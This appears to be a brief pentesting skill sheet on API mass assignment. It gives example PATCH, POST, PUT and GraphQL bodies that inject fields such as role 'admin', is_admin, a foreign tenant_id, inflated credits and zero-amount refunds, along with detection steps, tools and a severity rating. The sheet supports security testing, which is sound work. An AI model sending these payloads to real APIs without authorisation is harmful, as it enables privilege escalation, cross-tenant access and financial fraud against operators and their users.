# SKILL: API Mass Assignment
## Version: 1.0 | Domain: api

---

(See WEB/mass_assignment.md for full content — API-specific notes below)

## API-SPECIFIC PATTERNS
```http
PATCH /api/users/me
{"role": "admin", "is_verified": true, "tenant_id": "other", "credits": 99999}

POST /api/register
{"email": "x@y", "password": "z", "is_admin": true}

PUT /api/orders/123
{"status": "refunded", "amount": 0}
```

### GraphQL mutation mass assignment
```graphql
mutation { updateProfile(input: { name: "x", role: "admin", balance: 99999 }) { id role } }
```

## DETECTION
- GET /api/users/me → note all fields in response.
- PATCH with each field → observe acceptance.
- Swagger/OpenAPI schema may list "readOnly" fields that can still be written.

## TOOLS
Burp Param Miner, Arjun, manual JSON key fuzzing.

## SEVERITY
8.5–9.5 if role/privilege modified.
